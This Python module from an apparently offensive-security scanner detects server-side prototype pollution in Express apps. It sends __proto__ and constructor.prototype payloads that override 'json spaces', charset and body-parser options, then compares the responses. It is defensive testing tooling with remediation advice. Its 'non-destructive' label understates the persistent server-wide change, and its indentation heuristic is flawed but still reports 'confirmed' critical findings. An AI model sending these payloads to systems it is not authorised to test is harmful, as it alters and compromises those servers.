"""Server-Side Prototype Pollution scanner — non-destructive probes via JSON spaces, charset, constructor bypass."""
from __future__ import annotations
import asyncio
import hashlib
import json
import random
import string
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

SSPP_CANARY_PREFIX = "TLSMSSPP"

JSON_ENDPOINTS = [
    "/api/user", "/api/users", "/api/profile",
    "/api/v1/user", "/api/v1/users", "/api/v1/profile",
    "/api/data", "/api/config", "/api/settings",
    "/api/status", "/api/health",
    "/api/login", "/api/auth",
]


async def _detect_via_json_spaces(
    url: str, client: TalismanHTTPClient,
) -> dict[str, Any] | None:
    """Non-destructive SSPP detection via Express 'json spaces' gadget.

    If the server uses Express and the json spaces option is not explicitly set,
    polluting Object.prototype with 'json spaces' will change JSON response indentation.
    This is a SAFE, non-destructive probe — it only affects formatting, not application state.
    """
    canary_key = SSPP_CANARY_PREFIX + ''.join(random.choices(string.ascii_lowercase, k=8))

    # Step 1: Get baseline response formatting
    try:
        r_baseline = await client.get(url, timeout=10)
        baseline_text = r_baseline.text
    except Exception:
        return None

    # Step 2: Send POST with __proto__ payload to pollute json spaces
    probe_payloads = [
        {"__proto__": {"json spaces": 8}},
        {"constructor": {"prototype": {"json spaces": 8}}},
    ]

    for probe in probe_payloads:
        try:
            r_probe = await client.post(url, json=probe,
                headers={"Content-Type": "application/json"}, timeout=10)
        except Exception:
            continue

        # Step 3: Re-request and compare formatting
        try:
            r_after = await client.get(url, timeout=10)
            if r_after.status_code != r_baseline.status_code:
                continue

            after_text = r_after.text

            # Check for indentation change (Express adds spaces)
            baseline_indent = len(baseline_text) - len(baseline_text.rstrip())
            after_indent = len(after_text) - len(after_text.rstrip())

            if after_indent > baseline_indent and after_indent > 2:
                probe_type = "__proto__" if "__proto__" in str(probe) else "constructor.prototype"
                return {
                    "issue": "sspp_json_spaces",
                    "technique": probe_type,
                    "evidence": f"JSON indentation changed from {baseline_indent} to {after_indent} spaces",
                    "canary": canary_key,
                }

            # Also check for newline count change
            baseline_newlines = baseline_text.count("\n")
            after_newlines = after_text.count("\n")
            if after_newlines != baseline_newlines and after_newlines > baseline_newlines + 1:
                probe_type = "__proto__" if "__proto__" in str(probe) else "constructor.prototype"
                return {
                    "issue": "sspp_json_spaces",
                    "technique": probe_type,
                    "evidence": f"JSON newline count changed from {baseline_newlines} to {after_newlines}",
                    "canary": canary_key,
                }
        except Exception:
            continue

    return None


async def _detect_via_charset(
    url: str, client: TalismanHTTPClient,
) -> dict[str, Any] | None:
    """Non-destructive SSPP detection via Express charset override.

    Express uses 'charset' in the prototype to set response content-type charset.
    Polluting it will change the charset in Content-Type header.
    """
    for endpoint in JSON_ENDPOINTS:
        test_url = url.rstrip("/") + endpoint

        # Step 1: Baseline
        try:
            r_base = await client.get(test_url, timeout=8)
            if r_base.status_code != 200:
                continue
            base_ct = r_base.headers.get("content-type", "")
        except Exception:
            continue

        # Step 2: Probe with charset pollution
        charset_probes = [
            {"__proto__": {"charset": "iso-8859-1"}},
            {"constructor": {"prototype": {"charset": "iso-8859-1"}}},
        ]

        for probe in charset_probes:
            try:
                await client.post(test_url, json=probe,
                    headers={"Content-Type": "application/json"}, timeout=8)
            except Exception:
                continue

            # Step 3: Check if charset changed
            try:
                r_after = await client.get(test_url, timeout=8)
                after_ct = r_after.headers.get("content-type", "")

                if "iso-8859-1" in after_ct and "iso-8859-1" not in base_ct:
                    probe_type = "__proto__" if "__proto__" in str(probe) else "constructor.prototype"
                    return {
                        "issue": "sspp_charset",
                        "technique": probe_type,
                        "evidence": f"Content-Type charset changed from '{base_ct}' to '{after_ct}'",
                    }
            except Exception:
                continue

    return None


async def _detect_via_body_parser(
    url: str, client: TalismanHTTPClient,
) -> dict[str, Any] | None:
    """Detect SSPP via body-parser 'strict' option pollution.

    When body-parser's 'strict' option is polluted, it changes how JSON bodies are parsed.
    We detect this by sending a payload with duplicate keys and checking behavior change.
    """
    probe_payload = SSPP_CANARY_PREFIX + ''.join(random.choices(string.ascii_lowercase, k=8))
    test_value = probe_payload

    for endpoint in JSON_ENDPOINTS:
        test_url = url.rstrip("/") + endpoint

        # Baseline: send a simple request
        try:
            r_base = await client.post(test_url,
                json={"test": "value"},
                headers={"Content-Type": "application/json"}, timeout=8)
            base_status = r_base.status_code
        except Exception:
            continue

        # Probe: send __proto__ payload to disable strict mode
        proto_payloads = [
            {"__proto__": {"strict": False}},
            {"__proto__": {"type": "application/json"}},
        ]

        for proto in proto_payloads:
            try:
                await client.post(test_url, json=proto, timeout=8)
            except Exception:
                continue

            # Now send a body with prototype override
            try:
                r_test = await client.post(test_url,
                    json={"__proto__": {"polluted": test_value}},
                    headers={"Content-Type": "application/json"}, timeout=8)

                # Check if the pollution took effect by sending another request
                r_check = await client.post(test_url,
                    json={},
                    headers={"Content-Type": "application/json"}, timeout=8)

                if test_value in r_check.text:
                    return {
                        "issue": "sspp_body_parser",
                        "evidence": f"Polluted value '{test_value}' reflected in subsequent response",
                        "canary": test_value,
                    }
            except Exception:
                continue

    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module][+] Server-Side Prototype Pollution Scanner[/module] -> [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12) as client:
        # -- 1. JSON spaces detection (non-destructive) --------------------------------
        console.print("  Testing SSPP via JSON spaces override...")
        spaces_result = await _detect_via_json_spaces(url, client)
        if spaces_result:
            title = "Server-side prototype pollution via JSON spaces override"
            print_finding(title, "critical", url)
            findings.append({"technique": "json_spaces", **spaces_result})
            if session:
                await session.add_finding(
                    target=url, module="sspp",
                    vuln_type="sspp_json_spaces",
                    severity="critical", confidence="confirmed",
                    title=title,
                    description=f"Server-side prototype pollution confirmed via Express 'json spaces' gadget ({spaces_result.get('technique')}). The server's JSON response formatting changed after prototype pollution, confirming the vulnerability.",
                    evidence=spaces_result.get("evidence", ""),
                    remediation="1. Use Object.freeze(Object.prototype) at application startup. 2. Use --disable-proto=delete Node.js flag. 3. Validate and reject __proto__ and constructor keys in JSON input. 4. Update Express and body-parser to latest versions.",
                    cvss_score=9.8, cwe="CWE-1321",
                )

        # -- 2. Charset override detection -------------------------------------------
        console.print("  Testing SSPP via charset override...")
        charset_result = await _detect_via_charset(url, client)
        if charset_result:
            title = "Server-side prototype pollution via charset override"
            print_finding(title, "critical", url)
            findings.append({"technique": "charset", **charset_result})
            if session:
                await session.add_finding(
                    target=url, module="sspp",
                    vuln_type="sspp_charset",
                    severity="critical", confidence="confirmed",
                    title=title,
                    description=f"Server-side prototype pollution confirmed via Express charset override ({charset_result.get('technique')}). The Content-Type charset changed after prototype pollution.",
                    evidence=charset_result.get("evidence", ""),
                    remediation="1. Freeze Object.prototype. 2. Reject __proto__ in JSON. 3. Use --disable-proto=delete. 4. Explicitly set charset in app configuration.",
                    cvss_score=9.8, cwe="CWE-1321",
                )

        # -- 3. Body-parser strict mode detection ------------------------------------
        console.print("  Testing SSPP via body-parser strict mode...")
        body_result = await _detect_via_body_parser(url, client)
        if body_result:
            title = "Server-side prototype pollution via body-parser"
            print_finding(title, "critical", url)
            findings.append({"technique": "body_parser", **body_result})
            if session:
                await session.add_finding(
                    target=url, module="sspp",
                    vuln_type="sspp_body_parser",
                    severity="critical", confidence="confirmed",
                    title=title,
                    description=f"Server-side prototype pollution confirmed via body-parser strict mode. Unique canary '{body_result.get('canary', '')}' persisted across requests after prototype pollution.",
                    evidence=body_result.get("evidence", ""),
                    remediation="1. Always use strict mode in body-parser. 2. Sanitize JSON input before parsing. 3. Use JSON Schema validation with additionalProperties: false.",
                    cvss_score=9.8, cwe="CWE-1321",
                )

    console.print(f"  SSPP scan complete -- {len(findings)} issues")
    return {"target": url, "findings": findings, "count": len(findings)}
